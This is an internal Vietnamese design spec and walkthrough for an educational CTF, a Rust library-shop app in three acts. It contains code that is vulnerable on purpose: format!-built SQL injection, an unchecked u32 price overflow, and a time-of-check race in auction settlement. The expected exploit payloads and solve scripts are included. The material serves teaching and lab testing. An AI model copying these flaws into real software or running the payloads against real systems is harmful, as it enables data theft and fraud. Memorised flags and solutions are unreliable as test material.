# Thư Viện Cổ Antiqua — Spec & Walkthrough (nội bộ)

> Tài liệu thiết kế cho người ra đề. **KHÔNG** phát cho người chơi.
> CTF giáo dục môn IAW — 3 Act / 3 Flag, backend Rust (axum + sqlx + SQLite).

---

## 0. Quyết định kiến trúc (chốt trước khi code)

| Vấn đề | Quyết định |
|--------|-----------|
| Web framework | `axum` 0.7 + `tokio` (multi-thread runtime) |
| DB | `sqlx` + **SQLite** (file tại `/tmp/db/antiqua.db`, writable tmpfs) |
| Build | **`--release`** bắt buộc; `Cargo.toml` KHÔNG bật `overflow-checks` |
| Flag format | `FLAG{...}` |
| State isolation | **Mỗi container = 1 người chơi/team**. `entrypoint.sh` init DB mới mỗi lần start. Thêm endpoint ẩn `POST /admin/reset` (token tĩnh) để reset Act 2/3 nếu cần test. |
| readOnly rootfs | rootfs readOnly + mount `emptyDir`/`tmpfs` cho `/tmp/db`. SQLite ghi ở đó. |
| Port | 5001 (docker-compose), 8080 trong container |

### Vị trí 3 Flag (không trùng nhau, không lộ chéo)
- **Flag 1** — `users.secret_note` của user `admin` (chỉ lấy qua SQLi `/search`).
- **Flag 2** — `books.body` của sách restricted, server **chỉ trả về** sau khi mua thành công (đã ghi `purchases`). Không nằm trong DB dump của Flag 1 (cột `body` của sách restricted để rỗng/“[locked]” cho tới khi mua; flag thật nằm trong route handler, chỉ render khi có purchase).
- **Flag 3** — chuỗi server trả khi phát hiện 1 auction có >1 winner (double-settle). Không nằm trong DB.

---

## 1. Database schema

```sql
CREATE TABLE users (
  id           INTEGER PRIMARY KEY,
  username     TEXT NOT NULL UNIQUE,
  password     TEXT NOT NULL,          -- hash argon2 (login dùng prepared stmt)
  coins        INTEGER NOT NULL DEFAULT 1000,
  secret_note  TEXT                    -- admin: FLAG{...}  (Act 1)
);

CREATE TABLE books (
  id        INTEGER PRIMARY KEY,
  title     TEXT NOT NULL,
  author    TEXT NOT NULL,
  price     INTEGER NOT NULL,          -- restricted book = 9999
  restricted INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE purchases (
  id       INTEGER PRIMARY KEY,
  user_id  INTEGER NOT NULL,
  book_id  INTEGER NOT NULL
);

CREATE TABLE bids (
  id      INTEGER PRIMARY KEY,
  item    TEXT NOT NULL,
  status  TEXT NOT NULL DEFAULT 'open',   -- 'open' | 'settled'  (Act 3)
  winner  TEXT
);

CREATE TABLE settlements (             -- audit; >1 row cho 1 bid = double-settle
  id      INTEGER PRIMARY KEY,
  bid_id  INTEGER NOT NULL,
  who     TEXT NOT NULL
);
```

**Seed quan trọng:**
- `admin` với `secret_note = 'FLAG{...act1...}'`.
- 1 người chơi mặc định: `seeker / seeker` với `coins = 1000`.
- 1 sách restricted: `price = 9999`, `restricted = 1`.
- 1 bid `status='open'`.

### ⚠️ Thiết kế cho UNION (Act 1) — bắt buộc khớp cột
Endpoint `/search` chạy:
```sql
SELECT id, title, author FROM books WHERE title LIKE '%<q>%'
```
→ **3 cột, kiểu (int, text, text)**. Người chơi UNION với `users` phải khớp 3 cột:
```
' UNION SELECT id, username, secret_note FROM users-- 
```

---

## 2. ACT 1 — "Cánh cổng giả" (SQLi qua `format!`)

### Rabbit hole (cố ý vô hại)
`POST /login` dùng prepared statement chuẩn:
```rust
sqlx::query_as::<_, User>("SELECT * FROM users WHERE username = ? AND password = ?")
    .bind(&form.username).bind(&hash)
```
→ mọi payload SQLi ở login **fail**. Tốn ~30 phút như thiết kế.

### Hint dẫn đường
Trong `templates/index.html` (HTML source):
```html
<!-- search powered by legacy engine v1 -->
```
Trong `static/js/app.js`:
```js
// legacy search — kept for backward compat
fetch(`/search?q=${encodeURIComponent(query)}`)
```

### Con đường thật — `GET /search?q=`
```rust
// src/routes/books.rs  — LỖ HỔNG CỐ Ý
let sql = format!(
    "SELECT id, title, author FROM books WHERE title LIKE '%{}%'",
    q  // <-- nối thẳng input, không bind
);
let rows = sqlx::query(&sql).fetch_all(&pool).await?;
```

### Payload kỳ vọng (ghi vào walkthrough)
1. Xác nhận injectable: `/search?q=' OR '1'='1`
2. Tìm số cột: `/search?q=' ORDER BY 3--` (ok) / `ORDER BY 4--` (lỗi) → 3 cột.
3. Exfil flag:
   ```
   /search?q=' UNION SELECT id, username, secret_note FROM users--
   ```
   → row có `username = admin` chứa **FLAG 1** ở cột thứ 3.

> Lưu ý URL-encode khoảng trắng/`--` khi test bằng curl: `--%20` hoặc thêm space sau `--`.

---

## 3. ACT 2 — "Giá sách ma thuật" (integer overflow, release build)

### Tham số (đã verify bằng Python)
```
base_price (restricted) = 9999    (ODD -> gcd(9999, 2^32)=1, mọi remainder reachable)
balance (seeker)        = 1000
u32::MAX                = 4_294_967_295   (2^32 = 4_294_967_296)
```

### Lỗ hổng cố ý
```rust
// src/pricing.rs  — KHÔNG checked_mul, KHÔNG wrapping_mul, plain *
pub fn total_price(base_price: u32, quantity: u32) -> u32 {
    base_price * quantity   // release: wraps; debug: panic
}
```
```rust
// src/routes/books.rs (buy handler)
let cost = total_price(book.price as u32, form.quantity);  // quantity = input
if cost <= user.coins {                 // coins as u32
    // trừ tiền, ghi purchases, TRẢ books.body chứa FLAG 2
}
```

### ⚠️ Điều kiện sống còn (checklist build)
- [ ] `Cargo.toml`:
  ```toml
  [profile.release]
  overflow-checks = false   # (mặc định; KHÔNG đổi thành true)
  ```
- [ ] Dockerfile build `cargo build --release`.
- [ ] `quantity` là input runtime (đã đúng). Không viết test với literal (sẽ const-fold → compile error).
- [ ] Buy handler cấp quyền đọc sách **bất kể quantity**, chỉ cần `cost <= coins`.

### Hint dẫn đường
- `pricing.rs` comment: `// fast arithmetic, no checks needed in prod`.
- Response khi mua hụt trả `{"total_price": <cost>, "balance": 1000}` để người chơi thấy giá tính ra.

### Lời giải (ghi vào walkthrough) — VERIFIED
Cần `quantity` sao cho `(9999 * quantity) mod 2^32 <= 1000`.

**Cách A — quantity nhỏ nhất (linear scan):**
```
quantity = 6_872_635   →  cost = 629 coin   ✓ (<= 1000)
```
**Cách B — nhắm cost = 1 (modular inverse):**
```
quantity = 2_710_824_943   →  cost = 1 coin   ✓
```

Script giải mẫu (Python):
```python
MOD, base, balance = 2**32, 9999, 1000
# cách B: cost = 1
q = pow(base, -1, MOD)               # 2710824943
assert (base*q) % MOD == 1
print("quantity =", q)
# cách A: nhỏ nhất
q = next(i for i in range(1, 2**24) if 0 < (base*i)%MOD <= balance)  # 6872635
print("quantity nhỏ nhất =", q, "cost =", (base*q)%MOD)
```

**Bẫy cho AI/người chơi:** nếu giả định debug build → kết luận "sẽ panic, không khai thác được" → sai. Phải biết server `--release`.

> Nếu muốn TĂNG độ khó: đổi `base_price` về **10000** (gcd=16) → chỉ remainder bội 16 đạt được (smallest qty = 1_717_987 → cost 816). Mặc định spec dùng 9999 cho mượt.

---

## 4. ACT 3 — "Đồng hồ đếm ngược" (TOCTOU double-spend)

### Lỗ hổng cố ý
```rust
// src/routes/bids.rs  — read ... await(gap) ... write, KHÔNG atomic
pub async fn settle(State(pool): ..., Json(req): ...) -> impl IntoResponse {
    // 1) READ
    let bid = sqlx::query_as::<_,Bid>("SELECT * FROM bids WHERE id = ?")
        .bind(req.bid_id).fetch_one(&pool).await?;
    if bid.status != "open" {
        return error("auction closed");
    }
    // 2) WINDOW (giả lập xử lý chậm — nguồn race)
    tokio::time::sleep(Duration::from_millis(250)).await;
    // 3) WRITE + audit
    sqlx::query("UPDATE bids SET status='settled', winner=? WHERE id=?")
        .bind(&req.who).bind(req.bid_id).execute(&pool).await?;
    sqlx::query("INSERT INTO settlements(bid_id, who) VALUES (?,?)")
        .bind(req.bid_id).bind(&req.who).execute(&pool).await?;

    // 4) detect double-settle -> FLAG 3
    let n: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM settlements WHERE bid_id=?")
        .bind(req.bid_id).fetch_one(&pool).await?;
    if n > 1 {
        return ok(json!({"flag": "FLAG{...act3...}"}));
    }
    ok(json!({"status":"settled"}))
}
```

### ⚠️ Điều kiện sống còn
- [ ] Trạng thái bid ở **DB**, **KHÔNG** `Arc<Mutex>` in-process (Mutex sẽ chặn race).
- [ ] Không `BEGIN IMMEDIATE` / không `SELECT ... FOR UPDATE` quanh read→write.
- [ ] tokio multi-thread runtime; `sleep().await` đảm bảo interleave kể cả 1 thread.

### Hint dẫn đường
Response settle thành công kèm: `{"status":"settled","processing_window_ms":250}` → gợi ý window.

### Timeline kỳ vọng
```
T+0    Req A: SELECT status='open' ✓
T+10   Req B: SELECT status='open' ✓   (A chưa UPDATE)
T+250  Req A: UPDATE settled + INSERT settlement(#1)
T+251  Req B: UPDATE settled + INSERT settlement(#2) → COUNT=2 → FLAG 3
```

### Script giải mẫu (ghi vào walkthrough)
```python
import asyncio, aiohttp
URL = "http://localhost:5001/bids/settle"
async def hit(s): 
    async with s.post(URL, json={"bid_id":1, "who":"seeker"}) as r:
        print(await r.text())
async def main():
    async with aiohttp.ClientSession() as s:
        await asyncio.gather(hit(s), hit(s))   # 2 request song song
asyncio.run(main())
```
(Hoặc `curl ... & curl ... &` chạy nền 2 lệnh đồng thời.)

**Bẫy:** gửi tuần tự → request 2 thấy `status='settled'` → fail. Phải **đồng thời** trong window 250ms.

---

## 5. Cấu trúc file & trách nhiệm

```
antiqua-library/
├── Dockerfile            # multi-stage rust:slim(build --release) -> debian:slim
├── docker-compose.yml    # port 5001:8080
├── challenge.yaml        # K8s: UID 1000, readOnlyRootFS + tmpfs /tmp/db
├── entrypoint.sh         # tạo /tmp/db, init schema+seed, exec binary
├── Cargo.toml            # axum, sqlx(sqlite,runtime-tokio), tokio, serde, argon2
├── src/
│   ├── main.rs           # router, state(pool), bind 0.0.0.0:8080
│   ├── models.rs         # User, Book, Bid (FromRow)
│   ├── db.rs             # pool, init_db(), seed()
│   ├── pricing.rs        # total_price() — OVERFLOW (Act 2)
│   └── routes/
│       ├── auth.rs       # /login prepared stmt (rabbit hole)
│       ├── books.rs      # /search format! (Act 1) + /buy overflow (Act 2)
│       └── bids.rs       # /bids/settle TOCTOU (Act 3)
├── templates/
│   ├── index.html        # hint comment legacy engine
│   ├── login.html
│   └── catalog.html
└── static/js/app.js      # hint /search endpoint
```

### Endpoint map
| Method | Path | Act | Ghi chú |
|--------|------|-----|---------|
| GET  | `/` | — | trang chủ + hint HTML |
| POST | `/login` | rabbit hole | prepared stmt |
| GET  | `/search?q=` | **1** | `format!` SQLi |
| GET  | `/catalog` | — | list sách, thấy restricted |
| POST | `/buy` | **2** | overflow, trả Flag 2 |
| POST | `/bids/settle` | **3** | TOCTOU, trả Flag 3 |
| POST | `/admin/reset` | infra | reset DB (token tĩnh) |

---

## 6. Checklist nghiệm thu trước khi giao

- [ ] `docker compose up` → app chạy port 5001.
- [ ] Act 1: payload UNION trả đúng FLAG 1.
- [ ] Act 1: login SQLi **fail** (rabbit hole còn nguyên).
- [ ] Act 2: build là `--release` (xác nhận không panic khi quantity lớn); quantity 6_872_635 → mua thành công → FLAG 2.
- [ ] Act 2: quantity=1 → báo thiếu coin (đúng logic).
- [ ] Act 3: 2 request song song → FLAG 3; tuần tự → fail.
- [ ] 3 flag không lộ chéo (dump DB Act 1 không thấy Flag 2/3).
- [ ] Reset DB hoạt động (cho test lặp).
- [ ] readOnly rootfs + tmpfs ok, chạy UID 1000.
```
